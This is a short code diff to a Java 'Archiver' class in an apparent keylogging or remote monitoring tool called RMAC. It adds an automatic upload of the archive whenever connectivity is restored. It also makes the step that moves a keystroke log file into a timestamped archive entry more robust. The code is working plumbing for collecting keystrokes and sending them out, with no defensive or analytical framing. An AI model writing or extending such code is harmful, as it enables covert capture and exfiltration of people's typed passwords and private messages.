@@ -36,6 +36,12 @@ public class Archiver {
 
   public Archiver() {
     this.verifyFolders();
+
+    Connectivity.onChange(state -> {
+      if (state) {
+        this.uploadArchiveAsync();
+      }
+    });
   }
 
   /**
@@ -193,11 +199,13 @@ public class Archiver {
     }
 
     String keyFilePath = Constants.TEMP_LOCATION + "\\Key-" + Utils.getTimestamp() + ".txt";
-    try {
-      RMAC.fs.move(Constants.KEYLOG_LOCATION, keyFilePath, StandardCopyOption.REPLACE_EXISTING);
-      RMAC.archiver.moveToArchive(keyFilePath, ArchiveFileType.KEY);
-    } catch (IOException e) {
-      log.error("Could not move key file to temp", e);
+    if (RMAC.fs.exists(Constants.KEYLOG_LOCATION)) {
+      try {
+        RMAC.fs.move(Constants.KEYLOG_LOCATION, keyFilePath, StandardCopyOption.REPLACE_EXISTING);
+        RMAC.archiver.moveToArchive(keyFilePath, ArchiveFileType.KEY);
+      } catch (IOException e) {
+        log.error("Could not move key file to temp", e);
+      }
     }
   }
 
